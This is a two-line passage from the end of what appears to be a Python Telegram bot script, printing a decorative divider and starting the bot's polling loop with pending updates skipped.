    print("═══════════════════════════")
    bot.infinity_polling(skip_pending=True)